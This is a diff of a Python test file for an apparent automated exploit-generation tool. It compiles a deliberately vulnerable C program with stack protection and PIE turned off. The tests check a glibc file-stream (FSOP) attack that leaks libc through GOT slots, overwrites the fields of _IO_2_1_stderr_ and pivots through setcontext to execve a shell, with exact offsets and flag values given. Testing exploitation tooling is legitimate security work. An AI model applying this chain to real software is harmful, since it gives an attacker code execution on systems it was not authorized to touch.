@@ -152,41 +152,109 @@ int main(void){ setvbuf(stdout,0,2,0);
 '''
 
 
-def test_indexed_write_fsop_reaches_a_shell_with_no_win_function():
-    """The whole no-win route, live: an unbounded `table[i]` read recovers the libc base from a GOT
-    slot under real ASLR, the paired write places the five cells over _IO_2_1_stderr_, and exit()
-    spawns a shell. The fixture has no win function and no system() in its PLT, so every existing
-    L2->L3 recipe is inapplicable by construction."""
-    import tempfile
+def _fsop_shell(plans, tmp_factory):
+    """Build the indexed-write fixture and run `indexed_write_fsop` over it with `plans`."""
     from pathlib import Path
 
+    from lykos.analyze.poc import exploit, leak, rop
+    d = Path(tmp_factory())
+    (d / "t.c").write_text(_IDX_MENU)
+    exe = d / "idx"
+    gcc = shutil.which("gcc") or shutil.which("cc")
+    if subprocess.run([gcc, "-no-pie", "-fno-stack-protector", "-O0", "-w", str(d / "t.c"),
+                       "-o", str(exe)], capture_output=True).returncode:
+        pytest.skip("build failed")
+    blob = exe.read_bytes()
+    table = exploit.elf_objects_sized(blob)["table"][0]
+    return leak.indexed_write_fsop(
+        exe, d,
+        write_cell=lambda a, v: b"1\n%d\n%d\n" % ((a - table) // 8,
+                                                   struct.unpack("<q", struct.pack("<Q", v))[0]),
+        read_cell=lambda a: b"2\n%d\n" % ((a - table) // 8),
+        libc_data=open(_SYS_LIBC, "rb").read(),
+        leak_slots=[(a, n) for n, a in rop.got_entries(blob).items()],
+        scratch=table, exit_seqs=(b"3\n", b"q\n"), plans=plans)
+
+
+def _fsop_preconditions():
     from lykos.analyze.dynamic import sandbox
-    from lykos.analyze.poc import leak, rop
     if sandbox.host_arch() != "x86-64" or not _SYS_LIBC:
         pytest.skip("x86-64 + system libc required")
-    gcc = shutil.which("gcc") or shutil.which("cc")
-    if not gcc:
+    if not (shutil.which("gcc") or shutil.which("cc")):
         pytest.skip("no C compiler")
-    d = Path(tempfile.mkdtemp())
-    try:
-        (d / "t.c").write_text(_IDX_MENU)
-        exe = d / "idx"
-        if subprocess.run([gcc, "-no-pie", "-fno-stack-protector", "-O0", "-w", str(d / "t.c"),
-                           "-o", str(exe)], capture_output=True).returncode:
-            pytest.skip("build failed")
-        from lykos.analyze.poc import exploit
-        blob = exe.read_bytes()
-        table = exploit.elf_objects_sized(blob)["table"][0]
-        res = leak.indexed_write_fsop(
-            exe, d,
-            write_cell=lambda a, v: b"1\n%d\n%d\n" % ((a - table) // 8,
-                                                      struct.unpack("<q", struct.pack("<Q", v))[0]),
-            read_cell=lambda a: b"2\n%d\n" % ((a - table) // 8),
-            libc_data=open(_SYS_LIBC, "rb").read(),
-            leak_slots=[(a, n) for n, a in rop.got_entries(blob).items()],
-            scratch=table, exit_seqs=(b"3\n", b"q\n"))
-        assert res["ok"], res.get("reason")
-        assert res["libc_base"] % 0x1000 == 0 and len(res["cells"]) == 5
-        assert res["fp_name"] == "_IO_2_1_stderr_"
-    finally:
-        shutil.rmtree(d, ignore_errors=True)
+
+
+def test_indexed_write_fsop_reaches_a_shell_with_no_win_function(tmp_path_factory):
+    """The whole no-win route, live: an unbounded `table[i]` read recovers the libc base from a GOT
+    slot under real ASLR, the paired write places the cells over _IO_2_1_stderr_, and exit() spawns
+    a shell. The fixture has no win function and no system() in its PLT, so every existing L2->L3
+    recipe is inapplicable by construction. The default plan order puts setcontext first."""
+    _fsop_preconditions()
+    res = _fsop_shell(("setcontext", "system"), lambda: tmp_path_factory.mktemp("fsop"))
+    assert res["ok"], res.get("reason")
+    assert res["plan"] == "setcontext" and res["plans_tried"] == ["setcontext"]
+    assert res["libc_base"] % 0x1000 == 0 and len(res["cells"]) == 9
+    assert res["fp_name"] == "_IO_2_1_stderr_"
+
+
+def test_indexed_write_fsop_system_plan_still_reaches_a_shell(tmp_path_factory):
+    """The `system` plan on its own, so the five-cell route stays covered after setcontext took
+    over the default order."""
+    _fsop_preconditions()
+    res = _fsop_shell(("system",), lambda: tmp_path_factory.mktemp("fsop"))
+    assert res["ok"], res.get("reason")
+    assert res["plan"] == "system" and len(res["cells"]) == 5
+
+
+def test_find_setcontext_lands_on_the_register_load():
+    """`rop.find_setcontext` has to skip setcontext's own prologue: the symbol begins with an
+    rt_sigprocmask and then `mov rcx,[rdx+0xe0]; fldenv [rcx]; ldmxcsr [rdx+0x1c0]`, which would
+    make the forged context need a valid fpregs POINTER as well. The usable entry is the first
+    `mov rsp,[rdx+...]` after it -- +0x35 on glibc 2.4x, not the +61 the write-ups quote."""
+    if not _SYS_LIBC:
+        pytest.skip("no system libc")
+    from lykos.analyze.poc import rop
+    sc = rop.find_setcontext(open(_SYS_LIBC, "rb").read())
+    assert sc, "setcontext not located"
+    assert sc["entry"] > sc["sym"], "the entry must be past the prologue"
+    # The ucontext_t gregs offsets are fixed by the ABI (uc_mcontext at 0x28, gregs[RSP] == 15).
+    assert sc["fields"]["rsp"] == 0xA0 and sc["rip_at"] == 0xA8
+    assert sc["fields"]["rdi"] == 0x68 and sc["fields"]["rsi"] == 0x70
+    assert sc["fields"]["rdx"] == 0x88
+
+
+def test_setcontext_fsop_cells_turn_both_flag_bits():
+    """The two bits the route depends on, and the field aliasing that makes it work at all."""
+    T = {"rsp": 0xA0, "rdi": 0x68, "rsi": 0x70, "rdx": 0x88}
+    cells = heap.setcontext_fsop_cells(0x1000, flags=0xFBAD2086, wide_data=0x2000,
+                                       wide_vtable=0x404060, wfile_jumps=0xAAAA,
+                                       setcontext=0xCCCC, fields=T, rip_at=0xA8,
+                                       rip=0xEEEE, rdi=0xB105, rsi=0, rdx=0)
+    assert cells == [(0x404060 + 0x68, 0xCCCC),          # fake wide jump table's __doallocate
+                     (0x2000 + 0xE0, 0x404060),          # the wide_data's _wide_vtable
+                     (0x1000 + 0x28, 1),                 # _IO_write_ptr > _IO_write_base
+                     (0x1000 + 0x68, 0xB105),            # gregs[RDI] == _chain
+                     (0x1000 + 0x70, 0),                 # gregs[RSI] == _fileno
+                     (0x1000 + 0x88, 0),                 # gregs[RDX] == _lock
+                     (0x1000 + 0xA8, 0xEEEE),            # gregs[RIP] == _freeres_list
+                     (0x1000, 0xFBADA084),               # ~_IO_UNBUFFERED | _IO_USER_LOCK
+                     (0x1000 + 0xD8, 0xAAAA)]            # vtable == _IO_wfile_jumps, arms it
+    # _IO_UNBUFFERED cleared: _IO_wdoallocbuf opens `test BYTE PTR [rdi],2` and the unbuffered
+    # path never reaches the vtable call. _IO_USER_LOCK set: _IO_flockfile then never dereferences
+    # _lock, which is the only reason fp+0x88 is free to be a NULL rdx.
+    assert not cells[-2][1] & 0x2 and cells[-2][1] & 0x8000
+    # rsp is NOT a parameter: gregs[RSP] is the _wide_data field, so the pivoted stack is the
+    # forged wide_data by construction.
+    assert T["rsp"] == 0xA0 and not any(a == 0x1000 + 0xA0 for a, _ in cells)
+
+
+def test_setcontext_fsop_targets_name_execve_not_system():
+    """The point of the plan: the effect is execve, which `system` could not be."""
+    if not _SYS_LIBC:
+        pytest.skip("no system libc")
+    T = heap.setcontext_fsop_targets(open(_SYS_LIBC, "rb").read())
+    if not T:
+        pytest.skip("this libc exports no setcontext/execve pair")
+    assert T["fp_name"] == "_IO_2_1_stderr_"
+    assert T["execve"] > 0 and T["binsh"] > 0 and T["setcontext"] > 0
+    assert T["fields"]["rdx"] == 0x88 and T["rip_at"] == 0xA8
